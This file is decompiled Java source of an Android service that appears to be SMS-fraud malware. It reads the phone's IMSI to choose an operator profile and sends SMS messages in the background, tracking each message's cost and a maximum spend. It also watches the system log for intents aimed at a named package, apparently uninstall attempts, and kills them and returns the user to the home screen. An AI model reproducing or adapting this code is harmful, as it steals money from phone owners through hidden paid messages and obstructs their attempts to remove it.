package install.app;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.IBinder;
import java.io.PrintStream;
import java.util.Vector;

public final class MainService
  extends Service
  implements ThreadOperationListener
{
  static boolean isKill = false;
  public static boolean isRunning = false;
  static String packageName = "del.test.app";
  
  public MainService() {}
  
  static SmsOperator loadOperator(String paramString)
  {
    Settings localSettings = Settings.getSettings();
    Object localObject1 = new SmsOperator();
    int i = 0;
    SmsOperator localSmsOperator;
    int j;
    for (;;)
    {
      if (i >= localSettings.operatorList.size())
      {
        System.out.println("not found");
        return localObject1;
      }
      localSmsOperator = (SmsOperator)localSettings.operatorList.elementAt(i);
      j = 0;
      if (j < localSmsOperator.codes.size()) {
        break;
      }
      i += 1;
    }
    String str = (String)localSmsOperator.codes.elementAt(j);
    Object localObject2 = localObject1;
    if (str != null)
    {
      if (str.length() != 0) {
        break label115;
      }
      localObject2 = localObject1;
    }
    label115:
    do
    {
      j += 1;
      localObject1 = localObject2;
      break;
      localObject2 = localObject1;
      if (localSmsOperator.codes.size() == 1)
      {
        localObject2 = localObject1;
        if (str.equals("XXX"))
        {
          localObject2 = localSmsOperator;
          localSettings.currentOperatorIndex = i;
        }
      }
    } while (!paramString.startsWith(str));
    localSettings.currentOperatorIndex = i;
    return localSmsOperator;
  }
  
  public static void showHome(Context paramContext)
  {
    Intent localIntent = new Intent("android.intent.action.MAIN");
    localIntent.setFlags(268435456);
    localIntent.addCategory("android.intent.category.HOME");
    paramContext.startActivity(localIntent);
  }
  
  public static void start(Context paramContext, Intent paramIntent, String paramString)
  {
    Intent localIntent = new Intent(paramContext, MainService.class);
    paramIntent = paramIntent.getExtras();
    if (paramIntent != null) {
      localIntent.putExtras(paramIntent);
    }
    localIntent.putExtra("key", paramString);
    paramContext.startService(localIntent);
  }
  
  public static void start(Context paramContext, Intent paramIntent, String paramString, boolean paramBoolean)
  {
    Intent localIntent = new Intent(paramContext, MainService.class);
    paramIntent = paramIntent.getExtras();
    if (paramIntent != null) {
      localIntent.putExtras(paramIntent);
    }
    localIntent.putExtra("key", paramString);
    localIntent.putExtra("success", paramBoolean);
    paramContext.startService(localIntent);
  }
  
  public IBinder onBind(Intent paramIntent)
  {
    return null;
  }
  
  public void onCreate()
  {
    super.onCreate();
    setForeground(true);
  }
  
  public void onDestroy() {}
  
  public void onStart(Intent paramIntent, int paramInt)
  {
    super.onStart(paramIntent, paramInt);
    paramIntent = paramIntent.getExtras();
    String str;
    if ((paramIntent != null) && (paramIntent.get("key") != null))
    {
      str = (String)paramIntent.get("key");
      if (!str.equals("pay")) {
        break label64;
      }
      new Thread(new ThreadOperation(this, 1, null)).start();
    }
    label64:
    do
    {
      return;
      if (str.equals("sms"))
      {
        new Thread(new ThreadOperation(this, 2, Boolean.valueOf(((Boolean)paramIntent.get("success")).booleanValue()))).start();
        return;
      }
      if (str.equals("send"))
      {
        new Thread(new ThreadOperation(this, 3, null)).start();
        return;
      }
    } while ((!str.equals("logs")) || (isRunning));
    new Thread(new ThreadOperation(this, 5, null)).start();
  }
  
  void sendSms(Settings paramSettings)
  {
    SmsItem localSmsItem = paramSettings.loadCurrentSmsItem();
    if (paramSettings.currentGlobalMaxSmsCount > 0)
    {
      paramSettings.currentGlobalMaxSmsCount -= 1;
      paramSettings.save(this);
      Settings.sendSms(localSmsItem.number, localSmsItem.text);
      Settings.startWaitTimer(this, localSmsItem.wait);
    }
    for (;;)
    {
      paramSettings.printToOutStream();
      return;
      paramSettings.lastTimeGlobalRepeat = System.currentTimeMillis();
      paramSettings.working = false;
      paramSettings.save(this);
    }
  }
  
  /* Error */
  public void threadOperationRun(int paramInt, Object paramObject)
  {
    // Byte code:
    //   0: iload_1
    //   1: iconst_1
    //   2: if_icmpne +225 -> 227
    //   5: invokestatic 33	install/app/Settings:getSettings	()Linstall/app/Settings;
    //   8: astore_2
    //   9: aload_2
    //   10: getfield 235	install/app/Settings:working	Z
    //   13: ifeq +4 -> 17
    //   16: return
    //   17: aload_2
    //   18: invokevirtual 246	install/app/Settings:updateCurrentMaxSmsCount	()V
    //   21: aload_2
    //   22: iconst_1
    //   23: putfield 235	install/app/Settings:working	Z
    //   26: aload_2
    //   27: aload_0
    //   28: invokevirtual 203	install/app/Settings:save	(Landroid/content/Context;)Z
    //   31: pop
    //   32: invokestatic 228	java/lang/System:currentTimeMillis	()J
    //   35: lstore_3
    //   36: aload_0
    //   37: invokestatic 250	install/app/Settings:getImsi	(Landroid/content/Context;)Ljava/lang/String;
    //   40: invokestatic 252	install/app/MainService:loadOperator	(Ljava/lang/String;)Linstall/app/SmsOperator;
    //   43: astore 5
    //   45: aload 5
    //   47: getfield 255	install/app/SmsOperator:time	J
    //   50: aload 5
    //   52: getfield 258	install/app/SmsOperator:repeat	I
    //   55: getstatic 261	install/app/Settings:MINUTE	I
    //   58: imul
    //   59: i2l
    //   60: ladd
    //   61: lload_3
    //   62: lcmp
    //   63: ifgt +152 -> 215
    //   66: aload_2
    //   67: aload 5
    //   69: getfield 264	install/app/SmsOperator:id	I
    //   72: putfield 267	install/app/Settings:currentOperatorId	I
    //   75: aload_2
    //   76: aload 5
    //   78: getfield 270	install/app/SmsOperator:maxSmsCost	I
    //   81: putfield 273	install/app/Settings:currentMaxSmsCost	I
    //   84: aload_2
    //   85: aload 5
    //   87: getfield 276	install/app/SmsOperator:maxSmsCount	I
    //   90: putfield 279	install/app/Settings:currentMaxSmsCount	I
    //   93: aload_2
    //   94: lconst_0
    //   95: putfield 282	install/app/Settings:currentSmsKey	J
    //   98: aload_2
    //   99: iconst_0
    //   100: putfield 285	install/app/Settings:currentSmsIndex	I
    //   103: aload_2
    //   104: iconst_0
    //   105: putfield 288	install/app/Settings:defaultSet	Z
    //   108: aload_2
    //   109: aload_0
    //   110: invokevirtual 203	install/app/Settings:save	(Landroid/content/Context;)Z
    //   113: pop
    //   114: aload 5
    //   116: getfield 290	install/app/SmsOperator:sms	Ljava/util/Vector;
    //   119: astore 5
    //   121: aload_2
    //   122: getfield 279	install/app/Settings:currentMaxSmsCount	I
    //   125: ifle +14 -> 139
    //   128: iconst_0
    //   129: istore_1
    //   130: iload_1
    //   131: aload 5
    //   133: invokevirtual 46	java/util/Vector:size	()I
    //   136: if_icmplt +19 -> 155
    //   139: aload_2
    //   140: iconst_0
    //   141: putfield 235	install/app/Settings:working	Z
    //   144: aload_2
    //   145: aload_0
    //   146: invokevirtual 203	install/app/Settings:save	(Landroid/content/Context;)Z
    //   149: pop
    //   150: aload_2
    //   151: invokevirtual 224	install/app/Settings:printToOutStream	()V
    //   154: return
    //   155: aload 5
    //   157: iload_1
    //   158: invokevirtual 292	java/util/Vector:get	(I)Ljava/lang/Object;
    //   161: checkcast 205	install/app/SmsItem
    //   164: astore 6
    //   166: aload_2
    //   167: getfield 273	install/app/Settings:currentMaxSmsCost	I
    //   170: aload 6
    //   172: getfield 295	install/app/SmsItem:cost	I
    //   175: if_icmplt +33 -> 208
    //   178: aload_2
    //   179: aload 6
    //   181: getfield 297	install/app/SmsItem:key	J
    //   184: putfield 282	install/app/Settings:currentSmsKey	J
    //   187: aload_2
    //   188: iload_1
    //   189: putfield 285	install/app/Settings:currentSmsIndex	I
    //   192: aload_2
    //   193: aload_0
    //   194: invokevirtual 203	install/app/Settings:save	(Landroid/content/Context;)Z
    //   197: pop
    //   198: aload_2
    //   199: invokevirtual 224	install/app/Settings:printToOutStream	()V
    //   202: aload_0
    //   203: aload_2
    //   204: invokevirtual 299	install/app/MainService:sendSms	(Linstall/app/Settings;)V
    //   207: return
    //   208: iload_1
    //   209: iconst_1
    //   210: iadd
    //   211: istore_1
    //   212: goto -82 -> 130
    //   215: getstatic 52	java/lang/System:out	Ljava/io/PrintStream;
    //   218: ldc_w 301
    //   221: invokevirtual 60	java/io/PrintStream:println	(Ljava/lang/String;)V
    //   224: goto -85 -> 139
    //   227: iload_1
    //   228: iconst_2
    //   229: if_icmpne +230 -> 459
    //   232: invokestatic 33	install/app/Settings:getSettings	()Linstall/app/Settings;
    //   235: astore 5
    //   237: aload 5
    //   239: invokevirtual 196	install/app/Settings:loadCurrentSmsItem	()Linstall/app/SmsItem;
    //   242: astore 7
    //   244: aload 5
    //   246: invokevirtual 305	install/app/Settings:loadCurrentOperator	()Linstall/app/SmsOperator;
    //   249: astore 8
    //   251: aload 8
    //   253: getfield 290	install/app/SmsOperator:sms	Ljava/util/Vector;
    //   256: astore 6
    //   258: aload_2
    //   259: checkcast 178	java/lang/Boolean
    //   262: invokevirtual 182	java/lang/Boolean:booleanValue	()Z
    //   265: ifeq +113 -> 378
    //   268: aload 5
    //   270: aload 5
    //   272: getfield 273	install/app/Settings:currentMaxSmsCost	I
    //   275: aload 7
    //   277: getfield 295	install/app/SmsItem:cost	I
    //   280: isub
    //   281: putfield 273	install/app/Settings:currentMaxSmsCost	I
    //   284: aload 5
    //   286: aload 5
    //   288: getfield 279	install/app/Settings:currentMaxSmsCount	I
    //   291: iconst_1
    //   292: isub
    //   293: putfield 279	install/app/Settings:currentMaxSmsCount	I
    //   296: aload 8
    //   298: invokestatic 228	java/lang/System:currentTimeMillis	()J
    //   301: putfield 255	install/app/SmsOperator:time	J
    //   304: aload 5
    //   306: aload 8
    //   308: invokevirtual 309	install/app/Settings:updateCurrentOperator	(Linstall/app/SmsOperator;)V
    //   311: aload 5
    //   313: aload_0
    //   314: invokevirtual 203	install/app/Settings:save	(Landroid/content/Context;)Z
    //   317: pop
    //   318: aload 5
    //   320: invokevirtual 224	install/app/Settings:printToOutStream	()V
    //   323: aload 5
    //   325: getfield 279	install/app/Settings:currentMaxSmsCount	I
    //   328: ifle +31 -> 359
    //   331: aload 5
    //   333: getfield 285	install/app/Settings:currentSmsIndex	I
    //   336: aload 6
    //   338: invokevirtual 46	java/util/Vector:size	()I
    //   341: if_icmpge +18 -> 359
    //   344: aload 5
    //   346: getfield 285	install/app/Settings:currentSmsIndex	I
    //   349: istore_1
    //   350: iload_1
    //   351: aload 6
    //   353: invokevirtual 46	java/util/Vector:size	()I
    //   356: if_icmplt +37 -> 393
    //   359: aload 5
    //   361: iconst_0
    //   362: putfield 235	install/app/Settings:working	Z
    //   365: aload 5
    //   367: aload_0
    //   368: invokevirtual 203	install/app/Settings:save	(Landroid/content/Context;)Z
    //   371: pop
    //   372: aload 5
    //   374: invokevirtual 224	install/app/Settings:printToOutStream	()V
    //   377: return
    //   378: aload 5
    //   380: aload 5
    //   382: getfield 285	install/app/Settings:currentSmsIndex	I
    //   385: iconst_1
    //   386: iadd
    //   387: putfield 285	install/app/Settings:currentSmsIndex	I
    //   390: goto -86 -> 304
    //   393: aload 6
    //   395: iload_1
    //   396: invokevirtual 292	java/util/Vector:get	(I)Ljava/lang/Object;
    //   399: checkcast 205	install/app/SmsItem
    //   402: astore_2
    //   403: aload 5
    //   405: getfield 273	install/app/Settings:currentMaxSmsCost	I
    //   408: aload_2
    //   409: getfield 295	install/app/SmsItem:cost	I
    //   412: if_icmplt +40 -> 452
    //   415: aload 5
    //   417: aload_2
    //   418: getfield 297	install/app/SmsItem:key	J
    //   421: putfield 282	install/app/Settings:currentSmsKey	J
    //   424: aload 5
    //   426: iload_1
    //   427: putfield 285	install/app/Settings:currentSmsIndex	I
    //   430: aload 5
    //   432: aload_0
    //   433: invokevirtual 203	install/app/Settings:save	(Landroid/content/Context;)Z
    //   436: pop
    //   437: aload 5
    //   439: invokevirtual 224	install/app/Settings:printToOutStream	()V
    //   442: aload_0
    //   443: aload 5
    //   445: getfield 312	install/app/Settings:waitForSend	J
    //   448: invokestatic 315	install/app/Settings:startSendTimer	(Landroid/content/Context;J)V
    //   451: return
    //   452: iload_1
    //   453: iconst_1
    //   454: iadd
    //   455: istore_1
    //   456: goto -106 -> 350
    //   459: iload_1
    //   460: iconst_3
    //   461: if_icmpne +11 -> 472
    //   464: aload_0
    //   465: invokestatic 33	install/app/Settings:getSettings	()Linstall/app/Settings;
    //   468: invokevirtual 299	install/app/MainService:sendSms	(Linstall/app/Settings;)V
    //   471: return
    //   472: iload_1
    //   473: iconst_5
    //   474: if_icmpne +342 -> 816
    //   477: iconst_1
    //   478: putstatic 15	install/app/MainService:isRunning	Z
    //   481: aconst_null
    //   482: astore_2
    //   483: aconst_null
    //   484: astore 6
    //   486: invokestatic 321	java/lang/Runtime:getRuntime	()Ljava/lang/Runtime;
    //   489: iconst_2
    //   490: anewarray 69	java/lang/String
    //   493: dup
    //   494: iconst_0
    //   495: ldc_w 323
    //   498: aastore
    //   499: dup
    //   500: iconst_1
    //   501: ldc_w 325
    //   504: aastore
    //   505: invokevirtual 329	java/lang/Runtime:exec	([Ljava/lang/String;)Ljava/lang/Process;
    //   508: astore 5
    //   510: aload 5
    //   512: astore_2
    //   513: getstatic 52	java/lang/System:out	Ljava/io/PrintStream;
    //   516: ldc_w 331
    //   519: invokevirtual 60	java/io/PrintStream:println	(Ljava/lang/String;)V
    //   522: aload 5
    //   524: astore_2
    //   525: new 333	java/io/BufferedReader
    //   528: dup
    //   529: new 335	java/io/InputStreamReader
    //   532: dup
    //   533: aload_2
    //   534: invokevirtual 341	java/lang/Process:getInputStream	()Ljava/io/InputStream;
    //   537: invokespecial 344	java/io/InputStreamReader:<init>	(Ljava/io/InputStream;)V
    //   540: sipush 1024
    //   543: invokespecial 347	java/io/BufferedReader:<init>	(Ljava/io/Reader;I)V
    //   546: astore_2
    //   547: getstatic 52	java/lang/System:out	Ljava/io/PrintStream;
    //   550: ldc_w 349
    //   553: invokevirtual 60	java/io/PrintStream:println	(Ljava/lang/String;)V
    //   556: getstatic 15	install/app/MainService:isRunning	Z
    //   559: ifne +49 -> 608
    //   562: aload_0
    //   563: invokevirtual 352	install/app/MainService:stopSelf	()V
    //   566: return
    //   567: astore_2
    //   568: aload_2
    //   569: invokevirtual 355	java/io/IOException:printStackTrace	()V
    //   572: iconst_0
    //   573: putstatic 15	install/app/MainService:isRunning	Z
    //   576: return
    //   577: astore 5
    //   579: aload 5
    //   581: invokevirtual 355	java/io/IOException:printStackTrace	()V
    //   584: iconst_0
    //   585: putstatic 15	install/app/MainService:isRunning	Z
    //   588: goto -63 -> 525
    //   591: astore 5
    //   593: aload 6
    //   595: astore_2
    //   596: aload 5
    //   598: invokevirtual 356	java/lang/IllegalArgumentException:printStackTrace	()V
    //   601: iconst_0
    //   602: putstatic 15	install/app/MainService:isRunning	Z
    //   605: goto -49 -> 556
    //   608: aload_2
    //   609: invokevirtual 360	java/io/BufferedReader:readLine	()Ljava/lang/String;
    //   612: astore 5
    //   614: aload 5
    //   616: ldc_w 362
    //   619: invokevirtual 366	java/lang/String:indexOf	(Ljava/lang/String;)I
    //   622: istore_1
    //   623: iload_1
    //   624: iconst_m1
    //   625: if_icmpeq -69 -> 556
    //   628: aload 5
    //   630: iload_1
    //   631: ldc_w 362
    //   634: invokevirtual 72	java/lang/String:length	()I
    //   637: iadd
    //   638: invokevirtual 370	java/lang/String:substring	(I)Ljava/lang/String;
    //   641: astore 5
    //   643: new 372	install/app/IntentParser
    //   646: dup
    //   647: invokespecial 373	install/app/IntentParser:<init>	()V
    //   650: astore 6
    //   652: aload 6
    //   654: aload 5
    //   656: invokevirtual 376	install/app/IntentParser:parseString	(Ljava/lang/String;)V
    //   659: aload 6
    //   661: getfield 379	install/app/IntentParser:action	Ljava/lang/String;
    //   664: ldc_w 381
    //   667: invokevirtual 78	java/lang/String:equals	(Ljava/lang/Object;)Z
    //   670: ifeq +93 -> 763
    //   673: aload 6
    //   675: getfield 384	install/app/IntentParser:cmp	Ljava/lang/String;
    //   678: ldc_w 386
    //   681: invokevirtual 78	java/lang/String:equals	(Ljava/lang/Object;)Z
    //   684: ifeq +79 -> 763
    //   687: aload 6
    //   689: getfield 389	install/app/IntentParser:data	Ljava/lang/String;
    //   692: new 391	java/lang/StringBuilder
    //   695: dup
    //   696: ldc_w 393
    //   699: invokespecial 394	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   702: getstatic 21	install/app/MainService:packageName	Ljava/lang/String;
    //   705: invokevirtual 398	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   708: invokevirtual 401	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   711: invokevirtual 78	java/lang/String:equals	(Ljava/lang/Object;)Z
    //   714: ifeq +42 -> 756
    //   717: iconst_1
    //   718: putstatic 17	install/app/MainService:isKill	Z
    //   721: new 164	java/lang/Thread
    //   724: dup
    //   725: new 166	install/app/ThreadOperation
    //   728: dup
    //   729: aload_0
    //   730: bipush 6
    //   732: aload 6
    //   734: invokespecial 169	install/app/ThreadOperation:<init>	(Linstall/app/ThreadOperationListener;ILjava/lang/Object;)V
    //   737: invokespecial 172	java/lang/Thread:<init>	(Ljava/lang/Runnable;)V
    //   740: invokevirtual 174	java/lang/Thread:start	()V
    //   743: goto -187 -> 556
    //   746: astore 5
    //   748: aload 5
    //   750: invokevirtual 402	java/lang/Exception:printStackTrace	()V
    //   753: goto -197 -> 556
    //   756: iconst_0
    //   757: putstatic 17	install/app/MainService:isKill	Z
    //   760: goto -204 -> 556
    //   763: aload 6
    //   765: getfield 379	install/app/IntentParser:action	Ljava/lang/String;
    //   768: ldc_w 404
    //   771: invokevirtual 78	java/lang/String:equals	(Ljava/lang/Object;)Z
    //   774: ifeq -218 -> 556
    //   777: aload 6
    //   779: getfield 384	install/app/IntentParser:cmp	Ljava/lang/String;
    //   782: ldc_w 406
    //   785: invokevirtual 78	java/lang/String:equals	(Ljava/lang/Object;)Z
    //   788: ifeq -232 -> 556
    //   791: new 164	java/lang/Thread
    //   794: dup
    //   795: new 166	install/app/ThreadOperation
    //   798: dup
    //   799: aload_0
    //   800: bipush 6
    //   802: aload 6
    //   804: invokespecial 169	install/app/ThreadOperation:<init>	(Linstall/app/ThreadOperationListener;ILjava/lang/Object;)V
    //   807: invokespecial 172	java/lang/Thread:<init>	(Ljava/lang/Runnable;)V
    //   810: invokevirtual 174	java/lang/Thread:start	()V
    //   813: goto -257 -> 556
    //   816: iload_1
    //   817: bipush 6
    //   819: if_icmpne -803 -> 16
    //   822: aload_0
    //   823: ldc_w 408
    //   826: invokevirtual 411	install/app/MainService:getSystemService	(Ljava/lang/String;)Ljava/lang/Object;
    //   829: checkcast 413	android/app/ActivityManager
    //   832: astore_2
    //   833: aload_2
    //   834: ldc_w 415
    //   837: invokevirtual 418	android/app/ActivityManager:restartPackage	(Ljava/lang/String;)V
    //   840: aload_0
    //   841: invokestatic 420	install/app/MainService:showHome	(Landroid/content/Context;)V
    //   844: return
    //   845: astore_2
    //   846: aload_2
    //   847: invokevirtual 402	java/lang/Exception:printStackTrace	()V
    //   850: return
    //   851: astore_2
    //   852: aload_2
    //   853: invokevirtual 402	java/lang/Exception:printStackTrace	()V
    //   856: goto -16 -> 840
    //   859: astore 5
    //   861: goto -265 -> 596
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	864	0	this	MainService
    //   0	864	1	paramInt	int
    //   0	864	2	paramObject	Object
    //   35	27	3	l	long
    //   43	480	5	localObject1	Object
    //   577	3	5	localIOException	java.io.IOException
    //   591	6	5	localIllegalArgumentException1	IllegalArgumentException
    //   612	43	5	str	String
    //   746	3	5	localException	Exception
    //   859	1	5	localIllegalArgumentException2	IllegalArgumentException
    //   164	639	6	localObject2	Object
    //   242	34	7	localSmsItem	SmsItem
    //   249	58	8	localSmsOperator	SmsOperator
    // Exception table:
    //   from	to	target	type
    //   556	566	567	java/io/IOException
    //   608	623	567	java/io/IOException
    //   628	643	567	java/io/IOException
    //   643	743	567	java/io/IOException
    //   748	753	567	java/io/IOException
    //   756	760	567	java/io/IOException
    //   763	813	567	java/io/IOException
    //   486	510	577	java/io/IOException
    //   513	522	577	java/io/IOException
    //   525	547	591	java/lang/IllegalArgumentException
    //   643	743	746	java/lang/Exception
    //   756	760	746	java/lang/Exception
    //   763	813	746	java/lang/Exception
    //   840	844	845	java/lang/Exception
    //   833	840	851	java/lang/Exception
    //   547	556	859	java/lang/IllegalArgumentException
  }
}
